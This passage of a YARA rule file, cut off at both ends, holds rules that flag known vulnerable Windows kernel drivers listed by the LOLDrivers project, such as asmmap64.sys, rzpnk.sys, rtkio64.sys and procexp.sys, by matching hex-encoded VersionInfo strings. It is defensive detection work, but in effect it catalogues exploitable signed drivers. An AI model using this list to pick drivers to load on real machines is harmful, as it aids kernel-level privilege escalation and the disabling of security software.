\"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:32:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0030002c00200032002c00200031002c00200032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002c00200032002c00200031002c00200032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100540053005a0049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100540053005a0049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asus_Asmmapsys_Atkgenericfunctionservice_025E_RID3E6C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - asmmap64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:36:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d0065006d006f007200790020006d0061007000700069006e00670020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005300550053 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200039002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200039002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00610073006d006d00610070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410054004b002000470065006e0065007200690063002000460075006e006300740069006f006e00200053006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00610073006d006d00610070002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Razerinc_Rzpnk_Rzpnk_9724_RID3620 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rzpnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:42:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061007a006500720020004f007600650072006c0061007900200053007500700070006f00720074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061007a00650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310032002e0037003400360035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310032002e0037003400360035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0052007a0070006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030002d0032003000310034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiosys_Realtekiodriver_7133_RID3B0C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:12:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300038002e0030003800320033002e00320030003100370020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300038002e0030003800320033002e0032003000310037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100370020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Lgelectronicsinc_Lhasys_Microsoftwindowsoperatingsystem_23BA_RID44F5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - LHA.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:15:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c00480041 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004c004700200045006c0065006300740072006f006e00690063007300200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004c00480041002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004c00480041002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0075006c00740072006100620069006f007300400068006f0074006d00610069006c002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elitegroupcomputersystems_Ecsiodriversys_Ecsiodriver_2705_RID43B4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ecsiodriverx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:21:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045004300530049006f004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00690074006500670072006f0075007000200043006f006d00700075007400650072002000530079007300740065006d0073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045004300530049006f004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0045004300530049006f004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045004300530049006f004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039002d003200300031003000200045006c00690074006500670072006f0075007000200043006f006d00700075007400650072002000530079007300740065006d0073002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_8D33_RID343E : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:22:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310032002e0031003000310038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310032002e0031003000310038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]003300360030786c4ef659275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100320020003300360030002e0063006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Computerzsys_Ludashisystemdriver_C586_RID3B8C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:33:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e0039002e0031003100300035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e0039002e0031003100300035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Logmeininc_Lmiinfosys_Logmein_453B_RID39BD : DEMO EXE FILE T1219 {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - LMIinfo.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:16:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c006f0067004d00650049006e0020004b00650072006e0065006c00200049006e0066006f0072006d006100740069006f006e002000500072006f00760069006400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004c006f0067004d00650049006e002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310031002e0031002e0030002e0033003200320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310031002e0031002e0030002e0033003200320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004c004d00490069006e0066006f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c006f0067004d00650049006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004c004d00490069006e0066006f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300033002d00320030003100370020004c006f0067004d00650049006e002c00200049006e0063002e00200050006100740065006e00740065006400200061006e006400200070006100740065006e00740073002000700065006e00640069006e0067002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_76AF_RID3D5E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:51:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e003700300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003000380020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_1284_RID3BD1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sandra.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:45:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e006400720061002000440065007600690063006500200044007200690076006500720020002800570069006e003300320020007800380036002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0032002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0032002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d0032003000300035002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Rweverything_Asrsetupdrvsys_Asrsetupdrvdriver_9D93_RID410A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AsrSetupDrv103.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:28:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100730072005300650074007500700044007200760031003000330020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520057002d00450076006500720079007400680069006e0067 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030002e00300030002e00300030003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030002e00300030002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00410073007200530065007400750070004400720076003100300033002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100730072005300650074007500700044007200760031003000330020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00410073007200530065007400750070004400720076003100300033002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310031002000520057002d00450076006500720079007400680069006e0067 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Insydesoftwarecorp_Segwindrvxsys_Segwindowsdriverx_C628_RID430E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - segwindrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:54:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]003100300030002c00200030002c00200037002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]003100300030002c00200030002c00200037002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003100320020002d00200032003000310034002c00200049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmelsys_Trendmicroearlylaunchantimalwaredriver_D0EB_RID46EF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Tmel.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:39:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200045004c0041004d00200044007200690076006500720020002800360034002d0042006900740029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e0030002e0031003000300032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0065006c002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f0020004500610072006c00790020004c00610075006e0063006800200041006e00740069002d004d0061006c00770061007200650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0065006c002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Getactechnologycorporation_Mtcbsvsys_Getacsystemserviceprovider_EDBB_RID4872 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - GtcKmdfBs.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:44:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320031002c00200032002c00200030002c00200033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320031002c00200032002c00200030002c00200033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0074006300420053007600360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004700740063004b006d0064006600420073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300031003900200047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_2FBB_RID3BD1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:45:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_BCED_RID4662 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:16:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0039002e00330030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0039002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d002e002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000300035 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiowxsys_Realtekiodriver_082C_RID3C0A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:54:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC 